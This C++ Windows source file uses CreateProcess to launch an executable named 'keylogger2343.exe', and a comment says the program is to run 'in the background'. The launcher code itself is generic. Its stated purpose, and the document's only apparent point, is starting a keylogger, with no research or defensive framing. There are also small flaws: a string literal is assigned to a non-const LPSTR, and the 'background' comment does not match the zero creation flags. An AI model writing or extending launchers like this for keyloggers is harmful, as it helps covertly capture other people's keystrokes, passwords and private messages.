#include <iostream>
#include <windows.h>

int main() {
    // Create process information structures
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Path to the program you want to run in the background
    LPSTR programPath = "keylogger2343.exe"; // assuming it's in the current directory

    // Create child process
    if (!CreateProcess(NULL,   // No module name (use command line)
                       programPath,    // Path to the program
                       NULL,           // Process handle not inheritable
                       NULL,           // Thread handle not inheritable
                       FALSE,          // Set handle inheritance to FALSE
                       0,              // No creation flags
                       NULL,           // Use parent's environment block
                       NULL,           // Use parent's starting directory
                       &si,            // Pointer to STARTUPINFO structure
                       &pi)            // Pointer to PROCESS_INFORMATION structure
    ) {
        // Error handling if process creation fails
        std::cerr << "CreateProcess failed (" << GetLastError() << ")." << std::endl;
        return 1;
    }

    // Close process and thread handles to avoid resource leak
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
